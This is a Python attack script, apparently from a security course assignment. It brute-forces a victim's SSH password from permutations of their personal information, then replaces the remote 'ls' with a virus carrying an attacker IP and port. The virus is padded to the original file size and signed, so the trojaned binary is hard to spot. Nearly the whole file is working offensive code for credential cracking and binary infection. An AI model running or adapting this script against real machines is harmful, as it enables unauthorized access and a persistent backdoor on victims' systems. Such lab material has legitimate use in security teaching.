#!/usr/bin/env python3
from itertools import combinations, permutations
import paramiko
import time
import sys

def crack_ssh_passwd(victim_ip:str, username:str) -> paramiko.SSHClient:
    '''
    Cracking the victim’s password by launching a dictionary attack
    Crack the SSH password of the victim based on the personal information
    '''
    # Read the victim's personal information
    with open('victim.dat', 'r') as info_file:
        info = info_file.read().splitlines()
    # Generate all possible combinations of the personal information
    for i in range(1, len(info)+1):
        for comb in combinations(info, i):
            for perm in permutations(comb):
                password = ''.join(perm)
                crack_result = crack(victim_ip, username, password)
                if crack_result:
                    return crack_result
                    
            
def crack(target_ip:str, user:str, password:str) -> paramiko.SSHClient:
    '''
    Utilize paramiko to build SSH connection with the client while catching exceptions
    '''
    print(f"[*] Trying username: {user}, password: {password}")
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname=target_ip, username=user, password=password, timeout=15)
        print(f"[+] Password cracked for username: {user}, password: {password}")
        return ssh_client
    # Authentication failed
    except paramiko.AuthenticationException:
        print(f"[!] Username: {user}, password: {password} is incorrect!")
        return None
    # Other exceptions
    except Exception as e:
        print(f"[!] {e}. Retrying...")
        time.sleep(1) # Sleep for 1 second before retrying
        return crack(target_ip, user, password)
    
def infect_ls(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
    virus_file_path = "/app/ls"
    
    with open('virus', 'r') as f:
        virus_code = f.read()
        
    # Insert the attacker_ip and attacker_port into the virus_code
    virus_code = virus_code.replace('server_host', f'\\\"{attacker_ip}\\\"')
    virus_code = virus_code.replace('server_port', f'{attacker_port}')
    
    # Get path and size of ls
    _, stdout, _ = client.exec_command("which ls")
    ls_command_path = stdout.read().decode().strip()
    print(f"[*] victim's ls path: {ls_command_path}")
    _, stdout, _ = client.exec_command(f"ls -l {ls_command_path} | awk '{{print $5}}'")
    ls_command_size = stdout.read().decode().strip()
    
    # Get size of compressed ls and replace the "ls_zip_size" in virus
    _, stdout, _ = client.exec_command(f"zip -q new_ls {ls_command_path} && ls -l new_ls.zip | awk '{{print $5}}'")
    compressed_ls_size = stdout.read().decode().strip()
    print(f"[*] victim's compressed ls size: {compressed_ls_size}")
    virus_code = virus_code.replace('ls_zip_size', f'{compressed_ls_size}')
    
    # Calculate the virus size and replace the "virus_size" in virus
    backslash_count = virus_code.count('\\') # Count the number of backslashes in virus_code
    virus_size_without_append = len(virus_code) - backslash_count
    virus_size_without_append = virus_size_without_append - len("virus_size") + len(str(virus_size_without_append)) + 1 # I don't know why I need to +1
    virus_code = virus_code.replace('virus_size', f'{virus_size_without_append}')
    print(f"[*] victim's virus's size: {virus_size_without_append}")
    # print(virus_code)
    
    # Write the virus to the victim
    client.exec_command(f'echo "{virus_code}" > {virus_file_path}')
    # Append the compressed ls to the virus
    _, stdout, _ = client.exec_command(f"cat new_ls.zip >> {virus_file_path} && rm -f new_ls.zip")
    # Calculate the padding size and append the padding
    _, stdout, _ = client.exec_command(f"ls -l {virus_file_path} | awk '{{print $5}}'")
    virus_size_with_compressed_ls = stdout.read().decode().strip()
    padding_size = int(ls_command_size) - int(virus_size_with_compressed_ls) - 8  # last 8 bytes for signature
    _, stdout, _ = client.exec_command(f'dd if=/dev/zero bs={str(padding_size)} count=1 >> {virus_file_path};')
    
    # Sign the virus with b'20240000aabbccdd'
    _, stdout, _ = client.exec_command(f"echo -n '20240000aabbccdd' | xxd -r -p >> {virus_file_path};")
    _, stdout, _ = client.exec_command(f"chmod +x {virus_file_path};")
    print(f"[+] Victim Infected! Check victim's {virus_file_path}")
    
if __name__ == '__main__':
    # If the arguments are not provided, print the usage
    if len(sys.argv) != 4:
        print("Usage:" + sys.argv[0] + "<victim_ip> <attacker_ip> <attacker_port>")
        sys.exit(1)
        
    victim_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    # Task 1 
    client = crack_ssh_passwd(victim_ip, 'csc2024')
    if not client:
        print("Error! Cannot find the victim's password!")
        sys.exit(1)

    # Task 2 and task 3
    infect_ls(client, attacker_ip, attacker_port)
